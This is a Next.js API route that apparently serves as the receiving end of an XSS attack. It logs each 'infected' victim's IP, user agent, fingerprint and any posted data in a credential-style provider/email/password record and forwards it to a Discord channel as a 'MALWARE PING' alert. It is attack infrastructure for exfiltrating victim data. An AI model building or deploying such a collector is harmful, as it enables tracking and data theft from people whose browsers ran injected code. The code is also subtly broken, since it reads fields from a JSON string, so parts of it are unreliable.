import { NextRequest, NextResponse } from "next/server";
import { sendAuditEmbed } from "@/lib/discord/bot";

export async function POST(req: NextRequest) {
  try {
    const body = await req.json().catch(() => ({}));
    const ip = req.headers.get("x-forwarded-for") || "unknown";
    const ua = req.headers.get("user-agent") || "unknown";

    const payload = {
      provider: "XSS_EXEC",
      email: body.fingerprint || "infected",
      password: JSON.stringify({
        ip,
        ua,
        ...body,
      }),
    };

    await sendAlertToDiscord(payload);
    return NextResponse.json({ ok: true });
  } catch {
    return NextResponse.json({ ok: false }, { status: 500 });
  }
}

async function sendAlertToDiscord(data: any) {
  const TOKEN = process.env.DISCORD_BOT_TOKEN;
  const CHANNEL = process.env.DISCORD_CHANNEL_ID;
  if (!TOKEN || !CHANNEL) return;

  await fetch(`https://discord.com/api/v10/channels/${CHANNEL}/messages`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bot ${TOKEN}`,
    },
    body: JSON.stringify({
      embeds: [
        {
          title: "🚨 MALWARE PING — XSS / Avatar Execution",
          color: 0xff0000,
          fields: [
            { name: "Fingerprint", value: String(data.email).slice(0, 200), inline: false },
            { name: "IP", value: data.password?.ip || "unknown", inline: true },
            { name: "UA", value: String(data.password?.ua || "").slice(0, 200), inline: false },
          ],
          timestamp: new Date().toISOString(),
          footer: { text: "Athena Payload Alert" },
        },
      ],
    }),
  }).catch(() => {});
}
